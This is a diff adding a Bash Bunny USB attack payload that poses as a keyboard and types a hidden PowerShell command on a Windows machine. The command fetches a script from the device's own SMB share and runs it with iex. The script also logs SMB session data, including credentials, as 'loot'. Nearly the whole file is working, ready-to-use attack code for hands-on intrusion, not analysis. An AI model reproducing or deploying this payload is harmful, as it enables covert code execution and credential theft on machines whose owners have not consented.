@@ -1,0 +1,86 @@
+#!/bin/bash
+#
+# Title:         Powershell Download and Execute SMB
+# Author:        LowValueTarget
+# Version:       1.0
+# Category:      Powershell
+# Target:        Windows XP SP3+ (Powershell)
+# Attackmodes:   HID, RNDIS_ETHERNET
+# Firmware:      >= 1.1
+#
+# Quick HID attack to retrieve and run powershell payload from BashBunny SMBServer. Credentials are stored as loot.  
+# Ensure psh.txt exists in payload directory  
+#
+# Requires Impacket is installed (python ./impacket/setup.py install)  
+#
+# | Attack Stage        | Description                   |
+# | ------------------- | ------------------------------|
+# | Stage 1             | HID                           |
+# | Stage 2             | RNDIS_ETHERNET                |
+# | Stage 3             | Delivering powershell payload |
+#
+
+# SETUP
+LED SETUP
+REQUIRETOOL impacket # required for SMB server
+
+GET SWITCH_POSITION
+GET TARGET_HOSTNAME
+
+PAYLOAD_DIR=/root/udisk/payloads/$SWITCH_POSITION
+# Check for psh.txt
+if [ ! -f ${PAYLOAD_DIR}/psh.txt ]; then
+    LED FAIL
+    exit 1
+fi
+cp -R ${PAYLOAD_DIR}/* /tmp/
+
+LOOTDIR=/root/udisk/loot/psh_DownloadExecSMB
+# Setup named logs in loot directory
+mkdir -p ${LOOTDIR}
+HOST=${TARGET_HOSTNAME}
+# If hostname is blank set it to "noname"
+[[ -z "$HOST" ]] && HOST="noname"
+COUNT=$(ls -lad ${LOOTDIR}/$HOST* | wc -l)
+COUNT=$((COUNT+1))
+mkdir -p ${LOOTDIR}/${HOST}-$COUNT
+
+# Log file
+LOGFILE=psh_smb.log
+
+# Prevent premature access to SMB server
+echo "1" > /proc/sys/net/ipv4/icmp_echo_ignore_all
+
+# Start SMB Server
+mkdir -p /loot
+python /tools/impacket/examples/smbserver.py -comment 'Public Share' s /tmp/ > /loot/${LOGFILE} &
+
+# STAGE 1 - HID
+LED STAGE1
+ATTACKMODE HID
+
+RUN WIN "powershell -WindowStyle Hidden \"while (\$TRUE) {If (Test-Connection 172.16.64.1 -count 1 -quiet) {iex (New-Object Net.WebClient).DownloadString('\\\172.16.64.1\s\psh.txt');New-Item \\\172.16.64.1\s\COMPLETE -ItemType file;exit}}\""
+# Remove tracks in the psh payload if you wish
+
+# STAGE 2 - ETHERNET/SMB
+LED STAGE2
+ATTACKMODE RNDIS_ETHERNET
+
+# Re-enable ICMP ping to trigger the powershell stager
+echo "0" > /proc/sys/net/ipv4/icmp_echo_ignore_all
+
+# STAGE 3 - Wait until payload retrieved
+# Wait until payload is retrieved
+LED STAGE3
+while ! [ -f /tmp/COMPLETE ]; do sleep 0.5; done
+
+# CLEANUP
+LED CLEANUP
+
+# Move loot to mass storage
+mv /loot/${LOGFILE} ${LOOTDIR}/${HOST}-$COUNT
+rm /loot/${LOGFILE}
+# Sync file system
+sync; sleep 1; sync
+
+LED FINISH
